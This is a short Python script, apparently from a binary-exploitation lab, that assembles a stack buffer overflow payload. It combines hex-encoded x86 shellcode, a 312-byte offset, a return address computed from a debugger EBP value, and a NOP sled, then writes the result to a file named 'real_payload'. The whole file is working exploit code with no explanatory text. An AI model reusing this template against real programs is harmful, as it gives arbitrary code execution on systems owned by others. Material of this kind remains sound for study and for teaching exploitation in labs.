shellcode = ("\xbd\x2d\x05\x63\x7b\xd9\xc2\xd9\x74\x24\xf4\x5f\x33\xc9"
      "\xb1\x0b\x83\xc7\x04\x31\x6f\x11\x03\x6f\x11\xe2\xd8\x6f"
      "\x68\x23\xbb\x22\x08\xbb\x96\xa1\x5d\xdc\x80\x0a\x2d\x4b"
      "\x50\x3d\xfe\xe9\x39\xd3\x89\x0d\xeb\xc3\x82\xd1\x0b\x14"
      "\xbc\xb3\x62\x7a\xed\x5f\x07\x82\xa6\xcc\x6e\x63\x85\x73").encode('latin-1')

buffer_size = 312  # The exact offset found using pattern_offset
shellcode_size = len(shellcode)
nops = 200
ebp_addr = 0xffffd528  # Use the EBP value you found earlier
addr = ebp_addr + 80
print(f"[+] Return Address: {hex(addr)}")

content = bytearray(0x90 for _ in range(buffer_size))  # NOP sled until the offset
ret_address = addr.to_bytes(4, byteorder='little')
content += ret_address
content += b"\x90" * nops  # Add NOPs
content += shellcode

print(f"[+] Shellcode length: {len(shellcode)}")
print(f"[+] Payload length: {len(content)}")

with open('real_payload', 'wb') as f:
    f.write(content)
